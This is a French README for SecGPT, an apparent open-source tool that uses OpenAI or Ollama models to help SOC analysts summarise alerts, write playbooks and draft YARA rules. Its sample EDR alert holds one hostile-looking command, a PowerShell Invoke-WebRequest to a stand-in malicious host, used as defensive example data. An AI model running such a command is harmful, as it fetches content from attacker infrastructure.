
![image](https://github.com/user-attachments/assets/92577af6-2cac-47dc-9957-19f04de0d789)


# 🧠 SecGPT – Assistant IA pour analystes SOC

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-blue.svg?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.8+"/>
  <img src="https://img.shields.io/badge/LLM-OpenAI_&_Ollama-green.svg?style=for-the-badge&logo=openai&logoColor=white" alt="LLM"/>
  <img src="https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge" alt="License: MIT"/>
</p>

<p align="center">
  <b>Assistant IA conçu pour les analystes de sécurité SOC</b><br>
  <sub>🔍 Résumé d'alertes | 🛡️ Réponse aux incidents | 📋 Playbooks | 🧬 Règles YARA</sub>
</p>

---

## 📋 Description

**SecGPT** est un assistant IA pour les analystes SOC qui permet d'automatiser l'analyse initiale des alertes de sécurité. Il peut rapidement résumer des alertes complexes, suggérer des réponses appropriées, générer des playbooks et même proposer des règles YARA pour la détection.

> ⚠️ **Note importante** : Cet outil est conçu pour assister les analystes de sécurité, non pour les remplacer. Les recommandations générées doivent être examinées par un professionnel avant d'être appliquées.

### 🔍 Fonctionnalités principales

- 📄 **Résume des alertes** issues de différentes sources (EDR, mail de phishing, logs, etc.)
- 🔧 **Suggestion de réponses** adaptées au contexte de l'alerte
- ⚙️ **Génération de playbooks SOC** pour standardiser les procédures de réponse
- 🧬 **Création de règles YARA** de base pour la détection de menaces similaires
- 🧠 **Support de différents LLM** : GPT-4 (API OpenAI) ou modèles locaux via Ollama

## ⚙️ Installation

```bash
# Cloner le dépôt
git clone https://github.com/servais1983/SecGPT.git
cd SecGPT

# Installer les dépendances
pip install -r requirements.txt

# Configurer les variables d'environnement
cp .env.example .env
# Éditer .env avec votre clé API OpenAI ou configurez pour utiliser Ollama localement
```

## 🛠️ Utilisation

### Interface en ligne de commande

```bash
# Analyse d'une alerte à partir d'un fichier texte
python secgpt.py --input examples/alert.txt
```

### Interface web (Gradio)

```bash
# Lancer l'interface web
python ui/webapp.py
```

L'interface web sera accessible à l'adresse http://localhost:7860 par défaut.

## 💡 Exemples d'analyse

### Alerte JSON d'EDR

```json
{"timestamp":"2024-05-12T15:44:01Z","user":"jdoe","command":"powershell Invoke-WebRequest http://malicious.com","process":"powershell.exe"}
```

### Résultats générés

- **Résumé** : Analyse concise de l'alerte en langage clair
- **Réponse recommandée** : Actions à entreprendre immédiatement
- **Playbook** : Procédure étape par étape pour traiter l'incident
- **Règle YARA** : Détection de patterns similaires à l'avenir

## 🗂️ Structure du projet

```
secgpt/
├── app/              # Logique principale
│   ├── core.py       # Coordination des analyses IA
│   ├── models.py     # Connecteurs LLM (OpenAI, Ollama)
│   └── templates.py  # Prompts de base pour les LLM
├── ui/               # Interfaces utilisateur
│   └── webapp.py     # Interface web Gradio
├── examples/         # Exemples d'alertes pour tests
│   └── alert.txt     # Exemple d'alerte JSON
├── secgpt.py         # Interface CLI
├── requirements.txt  # Dépendances Python
├── .env.example      # Configuration (clés API, etc.)
└── README.md         # Documentation
```

## 🔄 Modes LLM supportés

Le projet supporte deux modes d'utilisation des LLM :

1. **OpenAI (GPT-4)** - Performances optimales mais nécessite une clé API et un coût d'utilisation
   - Configuration : `LLM_MODE=openai` dans .env
   - Nécessite : `OPENAI_API_KEY=sk-your-key-here`

2. **Ollama (local)** - Fonctionne entièrement en local, sans coût, mais performances réduites
   - Configuration : `LLM_MODE=ollama` dans .env (défaut)
   - Nécessite : [Ollama](https://ollama.ai/) installé localement avec au moins un modèle (llama2 par défaut)

## 📈 Fonctionnalités à venir

- [ ] Support pour d'autres modèles LLM (Claude, Gemini, etc.)
- [ ] Enrichissement contextuel des alertes (IOCs, réputation, etc.)
- [ ] Intégration MITRE ATT&CK pour classification des menaces
- [ ] Génération de rapports détaillés en format PDF
- [ ] API REST pour intégration à d'autres systèmes SOC
- [ ] Historisation et comparaison des alertes similaires

## 🤝 Contribuer

Les contributions sont les bienvenues ! N'hésitez pas à ouvrir une issue ou à soumettre une pull request.

## 📄 Licence

Ce projet est sous licence MIT - voir le fichier LICENSE pour plus de détails.

---

<p align="center">
  <sub>🔐 Développé pour aider les analystes SOC à traiter les alertes plus efficacement</sub>
</p>
